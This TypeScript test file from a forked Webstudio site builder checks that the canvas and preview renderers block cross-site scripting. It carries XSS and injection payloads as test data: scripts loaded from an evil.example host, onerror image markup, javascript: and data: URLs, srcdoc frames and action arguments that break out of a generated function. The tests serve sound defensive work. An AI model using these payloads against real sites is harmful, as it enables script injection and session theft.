import type { ReactNode } from "react";
import { createRoot, type Root } from "react-dom/client";
import { act } from "react-dom/test-utils";
import { afterEach, beforeEach, describe, expect, test } from "vitest";
import { cleanStores } from "nanostores";
import { createDefaultPages } from "@webstudio-is/project-build";
import { setEnv } from "@webstudio-is/feature-flags";
import {
  blockComponent,
  blockTemplateComponent,
  collectionComponent,
  elementComponent,
  encodeDataSourceVariable,
  SYSTEM_VARIABLE_ID,
  type DataSource,
  type Instance,
  type Prop,
} from "@webstudio-is/sdk";
import { ReactSdkContext } from "@webstudio-is/react-sdk/runtime";
import { lintExpression } from "@webstudio-is/expression";
import { textContentAttribute } from "@webstudio-is/react-sdk";
import { canvasComponentLibraries } from "@webstudio-is/sdk-components-registry/canvas";
import {
  $builderMode,
  $dataSourceVariables,
  $propValuesByInstanceSelector,
  $registeredComponents,
  getInstanceKey,
  registerComponentLibrary,
} from "~/shared/nano-states";
import { $externalContentRoots } from "~/shared/external-content-mutations";
import {
  $dataSources,
  $instances,
  $pages,
  $props,
  $resources,
} from "~/shared/sync/data-stores";
import { $selectedPageId } from "~/shared/nano-states/pages";
import { registerContainers } from "~/shared/sync/sync-stores";
import { computeResourceRequest } from "~/shared/resources";
import { createInstanceElement } from "./elements";
import {
  WebstudioComponentCanvas,
  WebstudioComponentPreview,
} from "./features/webstudio-component";
import {
  withOrgScriptPolicy,
  withoutBuiltWithWebstudio,
} from "./organizeos-org-script";
import { checkAction } from "@organizeos/site-components/org-script";

// The canvas copies every prop of an instance onto its component, so a prop
// named dangerouslySetInnerHTML would put raw markup into the builder's own
// origin, which holds the platform session (docs/ORGANIZEOS-FORK.md section 10).
// The same holds for the element it creates: a tag that is not one the builder
// offers must not reach React, which hoists a <script async src> into the
// document's <head> and runs it.

(
  globalThis as { IS_REACT_ACT_ENVIRONMENT?: boolean }
).IS_REACT_ACT_ENVIRONMENT = true;
registerContainers();
setEnv("*");

let root: Root | undefined;
let container: HTMLElement | undefined;

afterEach(() => {
  act(() => {
    root?.unmount();
  });
  container?.remove();
  root = undefined;
  container = undefined;
  $instances.set(new Map());
  $props.set(new Map());
  for (const script of evilScripts()) {
    script.remove();
  }
});

// React puts a hoisted <script async src> in document.head, outside the
// container, so look at the whole document
const evilScripts = () =>
  document.querySelectorAll<HTMLScriptElement>('script[src*="evil.example"]');

// React dedupes a hoisted script by its src for the life of the document,
// which every case of this file shares: a src a case has used makes the next
// case that uses it pass whatever the canvas renders. So each src is used once.
const usedScriptSources = new Set<string>();
const evilScriptSource = (name: string) => {
  const url = `https://evil.example/${name}.js`;
  if (usedScriptSources.has(url)) {
    throw new Error(`${url} is used by two cases`);
  }
  usedScriptSources.add(url);
  return url;
};

const ids = (...list: string[]): Instance["children"] =>
  list.map((value) => ({ type: "id", value }));

const instance = (init: Partial<Instance> & Pick<Instance, "id">) =>
  [
    init.id,
    { type: "instance", component: elementComponent, children: [], ...init },
  ] as [string, Instance];

const html = '<img id="pwn" src="x" onerror="window.pwned=1">';

const radixNamespace = "@webstudio-is/sdk-components-react-radix";

type Renderer = "canvas" | "preview";

const prepare = ({
  instances,
  props,
}: {
  instances: Array<[string, Instance]>;
  props: Array<[string, Prop]>;
}) => {
  // the libraries the canvas registers, with org script paused (canvas.tsx)
  for (const library of canvasComponentLibraries) {
    registerComponentLibrary(
      withOrgScriptPolicy(withoutBuiltWithWebstudio(library))
    );
  }
  $instances.set(new Map(instances));
  $props.set(new Map(props));
  $pages.set(
    createDefaultPages({ homePageId: "home", rootInstanceId: "body" })
  );
  $selectedPageId.set("home");
};

// 0.309.0 computes prop values asynchronously (computePropValues in
// shared/nano-states/props.ts), so a render first waits for the values of
// the stores prepare set: otherwise no prop reaches a component, and a check
// that nothing unsafe rendered passes for nothing.
const settleProps = () =>
  new Promise<void>((resolve, reject) => {
    const unsubscribe = $propValuesByInstanceSelector.listen(() => {
      clearTimeout(timer);
      unsubscribe();
      resolve();
    });
    const timer = setTimeout(() => {
      unsubscribe();
      reject(new Error("The prop values did not settle"));
    }, 2000);
  });

// A change to the stores, and then the prop values computed from it
const settled = async (change: () => void) => {
  const done = settleProps();
  change();
  await done;
};

const mountNow = (renderer: Renderer, element: ReactNode) => {
  container = document.createElement("div");
  document.body.appendChild(container);
  root = createRoot(container);
  act(() => {
    root?.render(
      <ReactSdkContext.Provider
        value={{
          renderer,
          assetBaseUrl: "/",
          imageLoader: () => "",
          resources: {},
          breakpoints: [],
          onError: console.error,
        }}
      >
        {element}
      </ReactSdkContext.Provider>
    );
  });
  return container;
};

const mount = async (renderer: Renderer, element: ReactNode) => {
  await settleProps();
  return mountNow(renderer, element);
};

const componentOf = (renderer: Renderer) =>
  renderer === "preview" ? WebstudioComponentPreview : WebstudioComponentCanvas;

const render = async ({
  instances,
  props,
  renderer,
}: {
  instances: Array<[string, Instance]>;
  props: Array<[string, Prop]>;
  renderer: Renderer;
}) => {
  prepare({ instances, props });
  return mount(
    renderer,
    createInstanceElement({
      instances: $instances.get(),
      instanceId: "body",
      instanceSelector: ["body"],
      Component: componentOf(renderer),
      components: $registeredComponents.get(),
    })
  );
};

const renderers: Renderer[] = ["canvas", "preview"];

describe.each(renderers)(
  "the %s renders an instance with a raw HTML prop",
  (renderer) => {
    beforeEach(() => {
      (window as { pwned?: number }).pwned = undefined;
    });

    test("without the markup, on a ws:element with a JSON value and with an expression", async () => {
      const dom = await render({
        renderer,
        instances: [
          instance({ id: "body", children: ids("json", "expression") }),
          instance({ id: "json", tag: "div" }),
          instance({ id: "expression", tag: "div" }),
        ],
        props: [
          [
            "json-html",
            {
              id: "json-html",
              instanceId: "json",
              name: "dangerouslySetInnerHTML",
              type: "json",
              value: { __html: html },
            },
          ],
          [
            "json-id",
            {
              id: "json-id",
              instanceId: "json",
              name: "id",
              type: "string",
              value: "json",
            },
          ],
          [
            "expression-html",
            {
              id: "expression-html",
              instanceId: "expression",
              name: "dangerouslySetInnerHTML",
              type: "expression",
              value: '{__html: "<img id=pwn2 src=x>"}',
            },
          ],
        ],
      });

      expect(dom.querySelector("img")).toBeNull();
      expect(dom.querySelector("#pwn")).toBeNull();
      expect(dom.querySelector("#pwn2")).toBeNull();
      // the element stays, with its other props
      expect(dom.querySelector("#json")).not.toBeNull();
      expect(dom.querySelectorAll("div").length).toBeGreaterThanOrEqual(3);
    });

    test("without the markup, on a Box", async () => {
      const dom = await render({
        renderer,
        instances: [
          instance({ id: "body", children: ids("box") }),
          instance({ id: "box", component: "Box" }),
        ],
        props: [
          [
            "box-html",
            {
              id: "box-html",
              instanceId: "box",
              name: "dangerouslySetInnerHTML",
              type: "json",
              value: { __html: "<script>window.pwned=1</script>" + html },
            },
          ],
        ],
      });

      expect(dom.querySelector("img")).toBeNull();
      expect(dom.querySelector("script")).toBeNull();
      expect((window as { pwned?: number }).pwned).toBeUndefined();
    });

    test("keeps the other props, whatever they look like", async () => {
      const dom = await render({
        renderer,
        instances: [
          instance({ id: "body", children: ids("kept") }),
          instance({ id: "kept", tag: "div" }),
        ],
        props: [
          [
            "kept-id",
            {
              id: "kept-id",
              instanceId: "kept",
              name: "id",
              type: "string",
              value: "kept",
            },
          ],
          [
            "kept-title",
            {
              id: "kept-title",
              instanceId: "kept",
              name: "title",
              type: "string",
              value: "dangerouslySetInnerHTML",
            },
          ],
        ],
      });

      const kept = dom.querySelector("#kept");
      expect(kept?.getAttribute("title")).toBe("dangerouslySetInnerHTML");
    });
  }
);

const prop = (
  instanceId: string,
  name: string,
  type: "string" | "boolean" | "expression",
  value: string | boolean
) => {
  const id = `${instanceId}:${name}`;
  return [id, { id, instanceId, name, type, value } as Prop] as [string, Prop];
};

describe.each(renderers)(
  "the %s renders an instance whose tag is not one the builder offers",
  (renderer) => {
    // React hoists a <script async src> into <head> and creates it with
    // document.createElement, so a browser fetches and runs it. Each case has
    // its own src (evilScriptSource).
    const src = (name: string) => evilScriptSource(`${renderer}-${name}`);

    const expectNoScript = (dom: HTMLElement) => {
      expect(evilScripts().length).toBe(0);
      expect(dom.querySelector("script")).toBeNull();
    };

    test("without a script, on a ws:element with tag script, an async prop and a src", async () => {
      const dom = await render({
        renderer,
        instances: [
          instance({ id: "body", children: ids("script") }),
          instance({ id: "script", tag: "script" }),
        ],
        props: [
          prop("script", "src", "string", src("element")),
          prop("script", "async", "boolean", true),
        ],
      });

      expectNoScript(dom);
      // the element is still there, as a div
      expect(dom.querySelector("[data-ws-id=script]")?.tagName).toBe("DIV");
    });

    test("without a script, on a ws:element with the tag SCRIPT and inline code", async () => {
      // React creates anything but the exact string "script" with
      // document.createElement, which makes a live script element
      const dom = await render({
        renderer,
        instances: [
          instance({
            id: "body",
            children: ids("upper", "mixed"),
          }),
          instance({
            id: "upper",
            tag: "SCRIPT",
            children: [{ type: "text", value: "window.pwned = 1" }],
          }),
          instance({ id: "mixed", tag: "Script" }),
        ],
        props: [
          prop("upper", "src", "string", src("upper")),
          prop("mixed", "src", "string", src("mixed")),
        ],
      });

      expectNoScript(dom);
      expect(dom.querySelector("[data-ws-id=upper]")?.tagName).toBe("DIV");
      expect(dom.querySelector("[data-ws-id=mixed]")?.tagName).toBe("DIV");
    });

    // each falls back to its own default element
    test.each([
      ["Box", "DIV"],
      ["Text", "DIV"],
      ["Heading", "H1"],
    ])(
      "without a script, on a %s with a data-ws-tag prop of script and an async expression",
      async (component, fallback) => {
        const dom = await render({
          renderer,
          instances: [
            instance({ id: "body", children: ids("c") }),
            instance({ id: "c", component }),
          ],
          props: [
            prop("c", "data-ws-tag", "string", "script"),
            prop("c", "src", "string", src(`data-ws-tag-${component}`)),
            prop("c", "async", "expression", "true"),
          ],
        });

        expectNoScript(dom);
        expect(dom.querySelector("[data-ws-id=c]")?.tagName).toBe(fallback);
      }
    );

    test("without a script, on a Box whose instance tag is script", async () => {
      const dom = await render({
        renderer,
        instances: [
          instance({ id: "body", children: ids("box") }),
          instance({ id: "box", component: "Box", tag: "script" }),
        ],
        props: [
          prop("box", "src", "string", src("instance-tag")),
          prop("box", "async", "boolean", true),
        ],
      });

      expectNoScript(dom);
      expect(dom.querySelector("[data-ws-id=box]")?.tagName).toBe("DIV");
    });

    test("without a script, on a Box whose legacy tag prop is an expression that evaluates to script", async () => {
      const dom = await render({
        renderer,
        instances: [
          instance({ id: "body", children: ids("box") }),
          instance({ id: "box", component: "Box" }),
        ],
        props: [
          prop("box", "tag", "expression", '"scr" + "ipt"'),
          prop("box", "src", "string", src("legacy-tag")),
          prop("box", "async", "expression", "true"),
        ],
      });

      expectNoScript(dom);
      expect(dom.querySelector("[data-ws-id=box]")?.tagName).toBe("DIV");
    });

    test("without a script, on a Dialog Title whose tag is an expression that evaluates to script", async () => {
      const dom = await render({
        renderer,
        instances: [
          instance({ id: "body", children: ids("dialog") }),
          instance({
            id: "dialog",
            component: `${radixNamespace}:Dialog`,
            children: ids("title"),
          }),
          instance({ id: "title", component: `${radixNamespace}:DialogTitle` }),
        ],
        props: [
          prop("dialog", "open", "boolean", true),
          prop("title", "tag", "expression", '"script"'),
          prop("title", "src", "string", src("dialog-title")),
          prop("title", "async", "expression", "true"),
        ],
      });

      expectNoScript(dom);
      // the title is rendered, with the component's own tag
      expect(document.querySelector("[data-ws-id=title]")).not.toBeNull();
    });

    test("without crashing, on a tag prop whose value is not a string", async () => {
      const dom = await render({
        renderer,
        instances: [
          instance({ id: "body", children: ids("number", "array") }),
          instance({ id: "number", component: "Box" }),
          instance({ id: "array", component: "Text" }),
        ],
        props: [
          prop("number", "tag", "expression", "1"),
          prop("array", "data-ws-tag", "expression", '["h1"]'),
        ],
      });

      expect(dom.querySelector("[data-ws-id=number]")?.tagName).toBe("DIV");
      expect(dom.querySelector("[data-ws-id=array]")?.tagName).toBe("DIV");
    });

    // The guards: an element the builder offers is created as before
    test("keeps a ws:element whose tag the builder offers", async () => {
      const dom = await render({
        renderer,
        instances: [
          instance({ id: "body", children: ids("section", "svg") }),
          instance({ id: "section", tag: "section" }),
          instance({ id: "svg", tag: "svg" }),
        ],
        props: [],
      });

      expect(dom.querySelector("[data-ws-id=section]")?.tagName).toBe(
        "SECTION"
      );
      expect(dom.querySelector("[data-ws-id=svg]")?.tagName).toBe("svg");
    });

    test("keeps the tag a Box, a Heading and a Dialog Title are given, when the builder offers it", async () => {
      const dom = await render({
        renderer,
        instances: [
          instance({
            id: "body",
            children: ids("box", "legacy", "heading", "dialog"),
          }),
          instance({ id: "box", component: "Box", tag: "nav" }),
          instance({ id: "legacy", component: "Box" }),
          instance({ id: "heading", component: "Heading" }),
          instance({
            id: "dialog",
            component: `${radixNamespace}:Dialog`,
            children: ids("title"),
          }),
          instance({ id: "title", component: `${radixNamespace}:DialogTitle` }),
        ],
        props: [
          prop("legacy", "tag", "string", "aside"),
          prop("heading", "data-ws-tag", "expression", '"h3"'),
          prop("dialog", "open", "boolean", true),
          prop("title", "tag", "expression", '"h4"'),
        ],
      });

      expect(dom.querySelector("[data-ws-id=box]")?.tagName).toBe("NAV");
      expect(dom.querySelector("[data-ws-id=legacy]")?.tagName).toBe("ASIDE");
      expect(dom.querySelector("[data-ws-id=heading]")?.tagName).toBe("H3");
      expect(document.querySelector("[data-ws-id=title]")?.tagName).toBe("H4");
    });
  }
);

// Radix's triggers render `<Primitive.Trigger asChild {...props}>`, and Radix's
// Slot merges those props onto the first child. So a `data-ws-tag` or `tag`
// prop on a trigger reaches the legacy Box, Text or Heading inside it, which
// makes its element from that prop. The rule is about the tag that reaches an
// element, whichever component holds the prop.
const forwarders: Array<[trigger: string, parents: string[]]> = [
  ["CollapsibleTrigger", ["Collapsible"]],
  ["DialogTrigger", ["Dialog"]],
  ["PopoverTrigger", ["Popover"]],
  ["TooltipTrigger", ["Tooltip"]],
  [
    "NavigationMenuLink",
    ["NavigationMenu", "NavigationMenuList", "NavigationMenuItem"],
  ],
  [
    "NavigationMenuTrigger",
    ["NavigationMenu", "NavigationMenuList", "NavigationMenuItem"],
  ],
];

/** Parents, then the trigger, then its child: the ids are p0, p1, ..., trigger, child */
const forwarderTree = (
  trigger: string,
  parents: string[],
  childComponent: string,
  triggerInit: Partial<Instance> = {}
) => {
  const ancestors = parents.map((_name, index) => `p${index}`);
  const chain = [...ancestors, "trigger", "child"];
  return [
    instance({ id: "body", children: ids(chain[0]) }),
    ...parents.map((name, index) =>
      instance({
        id: ancestors[index],
        component: `${radixNamespace}:${name}`,
        children: ids(chain[index + 1]),
      })
    ),
    instance({
      id: "trigger",
      component: `${radixNamespace}:${trigger}`,
      children: ids("child"),
      ...triggerInit,
    }),
    instance({ id: "child", component: childComponent }),
  ];
};

describe.each(renderers)(
  "the %s renders a legacy component inside a Radix trigger that passes a tag down",
  (renderer) => {
    const src = (name: string) =>
      evilScriptSource(`${renderer}-trigger-${name}`);

    const fallbacks: Array<[string, string]> = [
      ["Box", "DIV"],
      ["Text", "DIV"],
      ["Heading", "H1"],
    ];

    const cases = forwarders.flatMap(([trigger, parents]) =>
      fallbacks.flatMap(([child, fallback]) =>
        ["data-ws-tag", "tag"].map(
          (name) => [trigger, parents, child, fallback, name] as const
        )
      )
    );

    test.each(cases)(
      "without a script, in a %s over %s with the tag prop of the trigger",
      async (trigger, parents, child, fallback, name) => {
        // the browser runner's own scripts (Vite's client) are in the head
        const headScripts =
          document.head.querySelectorAll("script[src]").length;
        const dom = await render({
          renderer,
          instances: forwarderTree(trigger, parents, child),
          props: [
            prop("trigger", name, "string", "script"),
            prop(
              "trigger",
              "src",
              "string",
              src(`${trigger}-${child}-${name}`)
            ),
            prop("trigger", "async", "boolean", true),
          ],
        });

        expect(evilScripts().length).toBe(0);
        expect(dom.querySelector("script")).toBeNull();
        expect(document.head.querySelectorAll("script[src]")).toHaveLength(
          headScripts
        );
        // the child is rendered, as its own default element
        expect(document.querySelector("[data-ws-id=child]")?.tagName).toBe(
          fallback
        );
      }
    );

    test.each(["data-ws-tag", "tag"])(
      "without a script, when the trigger's %s prop is an expression that evaluates to script",
      async (name) => {
        const dom = await render({
          renderer,
          instances: forwarderTree(
            "CollapsibleTrigger",
            ["Collapsible"],
            "Box"
          ),
          props: [
            prop("trigger", name, "expression", '"scr" + "ipt"'),
            prop("trigger", "src", "string", src(`expression-${name}`)),
            prop("trigger", "async", "expression", "true"),
          ],
        });

        expect(evilScripts().length).toBe(0);
        expect(dom.querySelector("script")).toBeNull();
        expect(document.querySelector("[data-ws-id=child]")?.tagName).toBe(
          "DIV"
        );
      }
    );

    test("without a script, when the trigger's own instance tag is script", async () => {
      // the generator writes instance.tag as a data-ws-tag prop on every
      // component but ws:element, and the canvas does the same. Two checks
      // stop it, each alone: the trigger's tag gate in useInstanceProps, and
      // the child's withoutPausedProps. So this fails only when both are
      // gone; the wiring pins hold each one.
      const dom = await render({
        renderer,
        instances: forwarderTree("DialogTrigger", ["Dialog"], "Box", {
          tag: "script",
        }),
        props: [
          prop("trigger", "src", "string", src("own-instance-tag")),
          prop("trigger", "async", "boolean", true),
        ],
      });

      expect(evilScripts().length).toBe(0);
      expect(dom.querySelector("script")).toBeNull();
    });

    test("without a script, when the trigger that holds the tag prop passes it to a child that is itself a trigger", async () => {
      // the outer trigger's props go to the inner trigger, which spreads them
      // on to the Box
      const dom = await render({
        renderer,
        instances: [
          instance({ id: "body", children: ids("popover") }),
          instance({
            id: "popover",
            component: `${radixNamespace}:Popover`,
            children: ids("collapsible"),
          }),
          instance({
            id: "collapsible",
            component: `${radixNamespace}:Collapsible`,
            children: ids("outer"),
          }),
          instance({
            id: "outer",
            component: `${radixNamespace}:CollapsibleTrigger`,
            children: ids("inner"),
          }),
          instance({
            id: "inner",
            component: `${radixNamespace}:PopoverTrigger`,
            children: ids("child"),
          }),
          instance({ id: "child", component: "Box" }),
        ],
        props: [
          prop("outer", "data-ws-tag", "string", "script"),
          prop("outer", "src", "string", src("nested")),
          prop("outer", "async", "boolean", true),
        ],
      });

      expect(evilScripts().length).toBe(0);
      expect(dom.querySelector("script")).toBeNull();
      expect(document.querySelector("[data-ws-id=child]")?.tagName).toBe("DIV");
    });

    test("without crashing, on a trigger whose tag prop is not a string", async () => {
      await render({
        renderer,
        instances: forwarderTree("PopoverTrigger", ["Popover"], "Text"),
        props: [
          prop("trigger", "data-ws-tag", "expression", '["h1"]'),
          prop("trigger", "tag", "expression", "1"),
        ],
      });

      expect(document.querySelector("[data-ws-id=child]")?.tagName).toBe("DIV");
    });

    // The guards: what the builder offers is created as before
    test("keeps a tag the builder offers, passed down by a trigger", async () => {
      await render({
        renderer,
        instances: forwarderTree("DialogTrigger", ["Dialog"], "Box"),
        props: [prop("trigger", "data-ws-tag", "string", "nav")],
      });

      expect(document.querySelector("[data-ws-id=child]")?.tagName).toBe("NAV");
    });

    test("keeps the tag of an XML Node, which takes any tag name by design", async () => {
      const dom = await render({
        renderer,
        instances: [
          instance({ id: "body", children: ids("urlset") }),
          instance({
            id: "urlset",
            component: "XmlNode",
            children: ids("loc"),
          }),
          instance({ id: "loc", component: "XmlNode" }),
        ],
        props: [
          prop("urlset", "tag", "string", "urlset"),
          prop("loc", "tag", "string", "xhtml:link"),
        ],
      });

      expect(dom.textContent).toContain("<urlset");
      expect(dom.textContent).toContain("<xhtml:link");
    });

    test("keeps the attributes of a ws:element, whose tag is its own", async () => {
      const dom = await render({
        renderer,
        instances: [
          instance({ id: "body", children: ids("div") }),
          instance({ id: "div", tag: "div" }),
        ],
        props: [
          prop("div", "data-ws-tag", "string", "script"),
          prop("div", "tag", "string", "script"),
        ],
      });

      const element = dom.querySelector("[data-ws-id=div]");
      expect(element?.tagName).toBe("DIV");
      expect(element?.getAttribute("tag")).toBe("script");
      expect(evilScripts().length).toBe(0);
    });
  }
);

// A Radix trigger hands its props to the component it renders, so a component
// can receive a tag from its parent next to the props of its own instance. The
// canvas checks that tag where the two are merged, which is a different place
// from the check on the instance's own props: either alone keeps a script off
// the canvas, so these tests render the component with the tag passed in and
// an instance that holds no props, and fail if the check on what a parent
// passes in is taken back (docs/ORGANIZEOS-FORK.md section 10).
describe.each(renderers)(
  "the %s renders a tag a parent passes in",
  (renderer) => {
    // React dedupes hoisted scripts by src, so each renderer has its own
    const src = `https://evil.example/passed-${renderer}.js`;

    test("without a script, on a Box given a data-ws-tag of script, an async prop and a src", async () => {
      const box: Instance = {
        type: "instance",
        id: "box",
        component: "Box",
        children: [],
      };
      prepare({ instances: [["box", box]], props: [] });
      const Component = componentOf(renderer);
      const passedIn: Record<string, unknown> = {
        "data-ws-tag": "script",
        async: true,
        src,
      };

      const dom = await mount(
        renderer,
        <Component
          instance={box}
          instanceSelector={["box"]}
          components={$registeredComponents.get()}
          {...passedIn}
        />
      );

      expect(evilScripts().length).toBe(0);
      expect(dom.querySelector("script")).toBeNull();
      // the Box is rendered, as its own default element
      expect(dom.querySelector("[data-ws-id=box]")?.tagName).toBe("DIV");
    });
  }
);

// An address React writes as it is runs in the builder's own origin when it
// is clicked, framed, posted or loaded as an object, a srcdoc's markup runs
// there as the frame loads, and a string on… attribute runs on a custom
// element. Both renderers drop them from every prop a component receives, its
// own or a parent's, by the instance's component and tag
// (withoutPausedProps, docs/ORGANIZEOS-FORK.md section 10).
describe.each(renderers)(
  "the %s renders an unsafe address, a srcdoc or an event handler",
  (renderer) => {
    const xlink = "http://www.w3.org/1999/xlink";
    const pwn = "javascript:window.pwned = 1";

    beforeEach(() => {
      (window as { pwned?: number }).pwned = undefined;
      $dataSources.set(new Map());
      $dataSourceVariables.set(new Map());
    });

    const variable = (id: string, value: unknown) => {
      $dataSources.set(
        new Map($dataSources.get()).set(id, {
          type: "variable",
          id,
          name: id,
          scopeInstanceId: "body",
          value: Array.isArray(value)
            ? { type: "json", value }
            : { type: "string", value: String(value) },
        })
      );
    };

    const json = (instanceId: string, name: string, value: unknown) => {
      const id = `${instanceId}:${name}`;
      return [id, { id, instanceId, name, type: "json", value } as Prop] as [
        string,
        Prop,
      ];
    };

    // What is left of the attributes that hold an address, a frame document
    // or a handler, apart from upstream Link's own "#" when it is given none
    const unsafeAttributes = (element: Element | null) =>
      [
        "href",
        "src",
        "srcdoc",
        "data",
        "action",
        "formaction",
        "xlink:href",
        "onclick",
      ].filter(
        (name) =>
          element?.hasAttribute(name) === true &&
          (name === "href" && element.getAttribute(name) === "#") === false
      );

    test("without the attribute, wherever it is set", async () => {
      variable("target", pwn);
      variable("html", "<script>parent.pwned = 1</script>");
      variable("list", [pwn]);
      const dom = await render({
        renderer,
        instances: [
          instance({
            id: "body",
            children: ids(
              "anchor",
              "link",
              "frame",
              "frame-doc",
              "frame-bound-doc",
              "object",
              "form",
              "button",
              "svg",
              "bound-link",
              "custom",
              "object-list",
              "anchor-list"
            ),
          }),
          instance({ id: "anchor", tag: "a" }),
          instance({ id: "link", component: "Link" }),
          instance({ id: "frame", tag: "iframe" }),
          instance({ id: "frame-doc", tag: "iframe" }),
          instance({ id: "frame-bound-doc", tag: "iframe" }),
          instance({ id: "object", tag: "object" }),
          instance({ id: "form", tag: "form" }),
          instance({ id: "button", tag: "button" }),
          instance({ id: "svg", tag: "svg", children: ids("svg-link") }),
          instance({ id: "svg-link", tag: "a" }),
          instance({ id: "bound-link", component: "Link" }),
          instance({ id: "custom", tag: "div" }),
          instance({ id: "object-list", tag: "object" }),
          instance({ id: "anchor-list", tag: "a" }),
        ],
        props: [
          prop("anchor", "href", "string", pwn),
          prop("link", "href", "string", " JaVaScRiPt:window.pwned = 1"),
          prop("frame", "src", "string", pwn),
          prop(
            "frame-doc",
            "srcdoc",
            "string",
            "<script>parent.pwned = 1</script>"
          ),
          prop(
            "frame-bound-doc",
            "srcdoc",
            "expression",
            "$ws$dataSource$html"
          ),
          prop(
            "object",
            "data",
            "string",
            "data:text/html,<script>parent.pwned = 1</script>"
          ),
          prop("form", "action", "string", pwn),
          prop("button", "formaction", "string", pwn),
          prop("svg-link", "xlink:href", "string", pwn),
          prop("bound-link", "href", "expression", "$ws$dataSource$target"),
          prop("custom", "is", "string", "x-y"),
          prop("custom", "onclick", "string", "window.pwned = 1"),
          prop("object-list", "data", "expression", "$ws$dataSource$list"),
          json("anchor-list", "href", [pwn]),
        ],
      });

      for (const id of [
        "anchor",
        "link",
        "frame",
        "frame-doc",
        "frame-bound-doc",
        "object",
        "form",
        "button",
        "svg-link",
        "bound-link",
        "custom",
        "object-list",
        "anchor-list",
      ]) {
        const element = dom.querySelector(`[data-ws-id="${id}"]`);
        // the element is still there, without the attribute
        expect(element, id).not.toBeNull();
        expect(unsafeAttributes(element), id).toEqual([]);
        expect(element?.getAttributeNS(xlink, "href"), id).toBeNull();
      }
      expect(dom.innerHTML.toLowerCase()).not.toContain("javascript:");
      expect(dom.innerHTML).not.toContain("pwned");
      expect((window as { pwned?: number }).pwned).toBeUndefined();
    });

    test("without the address a Dialog Trigger passes to a Link that has none of its own", async () => {
      const dom = await render({
        renderer,
        instances: forwarderTree("DialogTrigger", ["Dialog"], "Link"),
        props: [prop("trigger", "href", "string", pwn)],
      });

      const child = document.querySelector("[data-ws-id=child]");
      expect(child).not.toBeNull();
      expect(unsafeAttributes(child)).toEqual([]);
      expect(dom.innerHTML.toLowerCase()).not.toContain("javascript:");
    });

    test("without an address a parent passes in", async () => {
      const link: Instance = {
        type: "instance",
        id: "link",
        component: "Link",
        children: [],
      };
      prepare({ instances: [["link", link]], props: [] });
      const Component = componentOf(renderer);
      const passedIn: Record<string, unknown> = { href: pwn };

      const dom = await mount(
        renderer,
        <Component
          instance={link}
          instanceSelector={["link"]}
          components={$registeredComponents.get()}
          {...passedIn}
        />
      );

      expect(unsafeAttributes(dom.querySelector("[data-ws-id=link]"))).toEqual(
        []
      );
      expect(dom.innerHTML.toLowerCase()).not.toContain("javascript:");
    });

    // The guards: what may run is rendered as before
    test("keeps safe addresses, an Image src bound to an https value and a Collection's data", async () => {
      variable("cover", "https://cdn.example.org/a.png");
      variable("records", [pwn, "/b"]);
      const safe = [
        "https://example.org/a",
        "mailto:a@example.org",
        "tel:+15555550123",
        "sms:+15555550123",
        "/a",
        "#b",
      ];
      const dom = await render({
        renderer,
        instances: [
          instance({
            id: "body",
            children: ids(
              ...safe.map((_href, index) => `safe-${index}`),
              "image",
              "collection"
            ),
          }),
          ...safe.map((_href, index) =>
            instance({ id: `safe-${index}`, component: "Link" })
          ),
          instance({ id: "image", component: "Image" }),
          instance({
            id: "collection",
            component: "ws:collection",
            children: ids("record"),
          }),
          instance({ id: "record", tag: "div" }),
        ],
        props: [
          ...safe.map((href, index) =>
            prop(`safe-${index}`, "href", "string", href)
          ),
          prop("image", "src", "expression", "$ws$dataSource$cover"),
          prop("image", "optimize", "boolean", false),
          prop("collection", "data", "expression", "$ws$dataSource$records"),
        ],
      });

      safe.forEach((href, index) => {
        expect(
          dom
            .querySelector(`[data-ws-id="safe-${index}"]`)
            ?.getAttribute("href")
        ).toBe(href);
      });
      expect(dom.querySelector("img")?.getAttribute("src")).toBe(
        "https://cdn.example.org/a.png"
      );
      // one item for each record, whatever the record holds
      expect(dom.querySelectorAll("[data-ws-id=record]")).toHaveLength(2);
    });

    // The design mode removes every handler (upstream's mergeProps), so only
    // the preview runs one
    test.runIf(renderer === "preview")(
      "keeps an action's handler",
      async () => {
        variable("clicked", "no");
        const dom = await render({
          renderer,
          instances: [
            instance({ id: "body", children: ids("button") }),
            instance({ id: "button", tag: "button" }),
          ],
          props: [
            [
              "button:onClick",
              {
                id: "button:onClick",
                instanceId: "button",
                name: "onClick",
                type: "action",
                value: [
                  {
                    type: "execute",
                    args: [],
                    code: `$ws$dataSource$clicked = "yes"`,
                  },
                ],
              },
            ],
          ],
        });

        act(() => {
          dom.querySelector<HTMLElement>("[data-ws-id=button]")?.click();
        });

        expect($dataSourceVariables.get().get("clicked")).toBe("yes");
      }
    );
  }
);

// The canvas writes an action's args into an arrow function's parameters and
// its code into the body, and runs that as soon as it computes prop values, in
// every mode and before any click. An action that input validation refuses is
// never compiled and does nothing; while org script is paused, one that
// actionMayRun refuses gets no function, so the element renders without the
// handler (getAction in shared/nano-states/props.ts, docs/ORGANIZEOS-FORK.md
// section 10).
describe("the canvas computes an action", () => {
  const pwned = () => (window as { pwned?: number }).pwned;

  const action = (
    instanceId: string,
    value: Array<{ args: string[]; code: string }>,
    name = "onClick"
  ): [string, Prop] => {
    const id = `${instanceId}:${name}`;
    return [
      id,
      {
        id,
        instanceId,
        name,
        type: "action",
        value: value.map((entry) => ({ type: "execute", ...entry })),
      },
    ];
  };

  // the refused actions on a button's onClick
  const refused = [
    "args",
    "code",
    "block",
    "member",
    "parameter",
    "generic",
    "stored",
    "outside",
    "empty",
    "regex",
    "shadow",
    "length",
    "resource",
    "newline",
    "newline-block",
    "newline-cr",
    "newline-ls",
    "newline-comment",
    "proto",
    "conflict",
    "taken",
    "comment",
  ];
  // and on a Signup Form's onStateChange, which passes plain data
  const refusedOnForm = [
    "form-member",
    "form-generic",
    "form-regex",
    "form-newline",
    "form-a",
    "form-named",
  ];

  const signupForm = "@organizeos/site-components:SignupForm";

  const instances = [
    instance({
      id: "body",
      children: ids(
        ...refused,
        ...refusedOnForm,
        "kept",
        "elsewhere",
        "signup"
      ),
    }),
    ...[...refused, "kept", "elsewhere"].map((id) =>
      instance({ id, tag: "button" })
    ),
    ...[...refusedOnForm, "signup"].map((id) =>
      instance({ id, component: signupForm })
    ),
  ];

  const props = [
    // args that close the parameter list and run a sequence
    action("args", [{ args: [") => 0, globalThis.pwned = 1, (x"], code: "0" }]),
    // a code that starts with a regular expression
    action("code", [
      {
        args: [],
        code: "/1}, globalThis.pwned = 2, () => { // 1 + $ws$dataSource$clicked",
      },
    ]),
    // a code that starts with an object
    action("block", [
      { args: [], code: '{} / "/}, globalThis.pwned = 3, () => { // "' },
    ]),
